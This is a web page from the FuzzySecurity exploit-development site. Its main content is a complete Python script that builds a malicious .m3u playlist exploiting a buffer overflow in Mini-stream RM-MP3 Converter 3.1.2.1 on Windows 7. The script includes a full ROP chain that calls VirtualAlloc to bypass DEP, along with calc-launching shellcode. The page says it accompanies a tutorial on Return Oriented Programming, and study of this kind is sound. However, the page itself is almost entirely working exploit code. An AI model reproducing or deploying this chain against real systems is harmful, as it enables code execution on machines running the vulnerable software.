<!DOCTYPE html>
<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
<head>

  <!-- Basic Page Needs -->
  <meta charset="utf-8">
  <title>FuzzySecurity | Exploits: Mini-stream RM-MP3 Converter</title>
  <meta name="description" content="">
  <meta name="author" content="">

  <!-- CSS Style -->
  <link rel="stylesheet" href="../css/style.css"> 
  
  <!-- Color Skins -->
  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
  
  <!-- Layout Style -->
  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
  
  <!-- Small Icons -->
  <link rel="stylesheet" href="../css/icons.css">
  
  <!-- SyntaxHighlighter -->
  <link type="text/css" rel="stylesheet" href="../css/shCoreEmacs.css"/>  
  
  <!-- Start JavaScript -->
  
    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
    
    <!-- SyntaxHighlighter -->
	<script type="text/javascript" src="../js/shCore.js"></script>
	<script type="text/javascript" src="../js/shBrushPython.js"></script>
    <script type="text/javascript">SyntaxHighlighter.all();</script>
  
  <!-- End JavaScript -->

  <!--[if lt IE 9]>
      <script src="js/html5.js"></script>
  <![endif]-->

  <!-- Favicons -->
  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">

</head>
<body>

  <div id="wrap" class="boxed">

  <header>
    <div class="container clearfix">
    
      <div class="five columns">
        <div class="logo">
        <a href="index.html">
          <img src="../images/logo.png" alt="FuzzySec" />
        </a>
        </div>
      </div><!-- End Logo -->
      
      <div class="eleven columns">
        <nav id="menu" class="navigation">
          <ul id="nav">
            <li><a href="../index.html">Home</a>
            </li>
            <li><a href="../tutorials.html">Tutorials</a>
            </li>
            <li><a href="../coding.html">Scripting</a>
            </li>
            <li><a href="../exploits.html" class="active">Exploits</a>
            </li>
            <li><a href="../links.html">Links</a>
            </li>
            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
          </ul> 
        </nav>
      </div><!-- End Menu -->
      
      
      <div class="sixteen columns"><hr /></div>
      
    </div><!-- End Container -->
  </header><!-- <<< End Header >>> -->
  
  <div class="container clearfix">
  
    <div class="page-columns">
    
    <ul class="breadcrumbs">
      <li><a href="index.html"><span class="icon home gray"></span></a></li>
          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
          <li><a href="../exploits.html">Exploits</a> <b>&#187;</b></li>
          <li>Mini-stream RM-MP3 Converter</li>
      </ul>
      
      <!-- section 16 Columns -->
      
      <div class="recent-work gallery clearfix">
      <div class="eighteen columns bottom">
	<div style="height:20px;" align="right">
		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
	</div>
        <h2 class="title">Mini-stream RM-MP3 Converter (*.m3u)<span class="line"></span></h2>


    <p>&nbsp;</p>
    <div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
          <div class="caption">
          <a href="images/Big_rop7.png" rel="prettyPhoto[ministream]">
          <img src="images/Small_rop7.png" alt="" class="pic" />
          <span class="hover-effect zoom"></span></a>
          </div><!-- hover effect -->
          
      </div>
      
<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
<p>Created for part seven of my exploit development tutorials covering Return Oriented Programming.&nbsp;</p>
<div class="eighteen columns bottom">
    <div class="main_wrap_support">
<pre class="brush: py;gutter:false;auto-links: false;;">
#!/usr/bin/python

#----------------------------------------------------------------------------------#
# Exploit: Mini-stream RM-MP3 Converter 3.1.2.1 (*.m3u)                            #
# OS: Win7 Pro SP1                                                                 #
# Author: b33f (Ruben Boonen)                                                      #
# Software: http://www.exploit-db.com/wp-content/themes/exploit/applications       #
#          /ce47c348747cd05020b242da250c0da3-Mini-streamRM-MP3Converter.exe        #
#----------------------------------------------------------------------------------#
# This exploit was created for Part 7 of my Exploit Development tutorial           #
# series - http://www.fuzzysecurity.com/tutorials/expDev/7.html                    #
#----------------------------------------------------------------------------------#

import sys, struct

file=&quot;crash.m3u&quot;

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         =&gt; PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       =&gt; Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          =&gt; dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, =&gt; flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         =&gt; flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 =&gt; Nop                                                 #
# ECX 00000040 =&gt; flProtect                                           #
# EDX 00001000 =&gt; flAllocationType                                    #
# EBX 00000001 =&gt; dwSize                                              #
# ESP ???????? =&gt; Leave as is                                         #
# EBP ???????? =&gt; Call to ESP (jmp, call, push,..)                    #
# ESI ???????? =&gt; PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 =&gt; ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#
rop = struct.pack('&lt;L',0x41414141)  # padding to compensate 4-bytes at ESP
rop += struct.pack('&lt;L',0x10029b57) # POP EDI # RETN
rop += struct.pack('&lt;L',0x1002b9ff) # ROP-Nop
                                    #-----------------------------------------[ROP-Nop -&gt; EDI]-#
rop += struct.pack('&lt;L',0x100280de) # POP ECX # RETN
rop += struct.pack('&lt;L',0xffffffff) # will become 0x40
rop += struct.pack('&lt;L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('&lt;L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('&lt;L',0x1002a487) # ADD ECX,ECX # RETN
                                    #--------------------------------[flProtect (0x40) -&gt; ECX]-#
rop += struct.pack('&lt;L',0x1002ba02) # POP EAX # RETN
rop += struct.pack('&lt;L',0x1005d060) # kernel32.virtualalloc
rop += struct.pack('&lt;L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('&lt;L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN
                                    #------------------------------------[VirtualAlloc -&gt; ESI]-#
rop += struct.pack('&lt;L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('&lt;L',0x41414141) # padding for POP EBP
rop += struct.pack('&lt;L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('&lt;L',0x1A750FFF) # ebx+edx =&gt; 0x1000 flAllocationType
rop += struct.pack('&lt;L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('&lt;L',0x1002b9ff) # Rop-Nop to compensate
                                    #-----------------------[flAllocationType (0x1000) -&gt; EDX]-#
rop += struct.pack('&lt;L',0x100532ed) # POP EBP # RETN
rop += struct.pack('&lt;L',0x100371f5) # CALL ESP
                                    #----------------------------------------[CALL ESP -&gt; EBP]-#
rop += struct.pack('&lt;L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('&lt;L',0xffffffff) # will be 0x1
rop += struct.pack('&lt;L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('&lt;L',0x100319d3) # INC EBX # FPATAN # RETN
                                    #------------------------------------[dwSize (0x1) -&gt; EBX]-#
rop += struct.pack('&lt;L',0x10030361) # POP EAX # RETN
rop += struct.pack('&lt;L',0x90909090) # NOP
                                    #---------------------------------------------[NOP -&gt; EAX]-#
rop += struct.pack('&lt;L',0x10014720) # PUSHAD # RETN
                                    #----------------------------------------[PUSHAD -&gt; pwnd!]-#

# SkyLined's Calc shellcode
calc = (
&quot;\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64&quot;
&quot;\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B&quot;
&quot;\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20&quot;
&quot;\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07&quot;
&quot;\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74&quot;
&quot;\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7&quot;)
                                                                                                                         
#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10019C60 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
shell = &quot;\x90&quot;*5 + calc
crash = &quot;http://.&quot; + &quot;A&quot;*17416 + &quot;\x60\x9C\x01\x10&quot; + rop + shell + &quot;C&quot;*(7572-len(rop + shell))

writeFile = open (file, &quot;w&quot;)
writeFile.write( crash )
writeFile.close()</pre>
</div>
	</div>
</div>
      
      <!-- End  -->
    	</div>    
    </div><!-- End page-columns -->
     
         <div align="center"><script>
           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
           var idcomments_post_id;
           var idcomments_post_url;
           </script>
             <span id="IDCommentsPostTitle" style="display:none"></span>
           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
         </div>
     
  </div><!-- <<< End Container >>> -->
  
  <footer>
    <div class="container">
    
      
      <div class="six columns"><span class="copyright">
      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
      
      <div class="six columns">
        
          <p><a href="../index.html">Home</a> |
          <a href="../tutorials.html">Tutorials</a> |
          <a href="../coding.html">Scripting</a> |
          <a href="../exploits.html">Exploits</a> |
          <a href="../links.html">Links</a> |
          <a href="../contact.html">Contact</a></p>
        
      </div>
    
    </div><!-- End container -->
  </footer><!-- <<< End Footer >>> -->
  
  </div><!-- End wrap -->
  
  <!-- Start Style Switcher -->
  <div class="switcher"></div>
  <!-- End Style Switcher -->
    
</body>
</html>